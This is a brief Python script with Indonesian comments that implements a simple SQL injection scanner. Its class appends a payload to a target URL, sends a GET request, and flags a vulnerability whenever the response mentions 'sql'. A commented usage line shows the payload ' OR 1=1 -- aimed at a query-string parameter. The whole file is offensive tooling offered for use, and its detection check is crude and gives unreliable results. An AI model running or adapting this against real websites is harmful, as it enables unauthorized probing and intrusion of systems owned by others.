import requests
import logging

logger = logging.getLogger(__name__)

class SQLInjection:
    def __init__(self, target_url):
        self.target_url = target_url

    def inject(self, payload):
        """
        Mengirimkan payload SQL injection ke target.
        """
        try:
            response = requests.get(self.target_url + payload)
            if "sql" in response.text.lower():
                logger.info(f"Potential SQL Injection vulnerability found at {self.target_url}")
            else:
                logger.info("No SQL injection detected.")
        except Exception as e:
            logger.error(f"Error during SQL injection: {str(e)}")

# Contoh penggunaan:
# sql_injector = SQLInjection("http://example.com/vulnerable-page.php?id=")
# sql_injector.inject("' OR 1=1 --")
